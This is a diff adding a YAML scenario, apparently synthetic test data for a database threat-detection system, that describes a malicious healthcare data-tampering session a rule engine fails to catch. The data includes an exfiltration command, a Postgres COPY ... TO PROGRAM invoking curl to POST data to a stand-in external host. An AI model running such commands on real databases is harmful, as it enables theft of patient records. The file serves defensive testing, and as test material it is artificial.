@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_51_data_tamper_mal_1430
+family_id: gen_healthcare_51_data_tamper_mal_fam1430
+domain: healthcare
+time_of_day: 01:05
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: INSERT INTO prescriptions DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 10.18.25.96
+      port: 8443
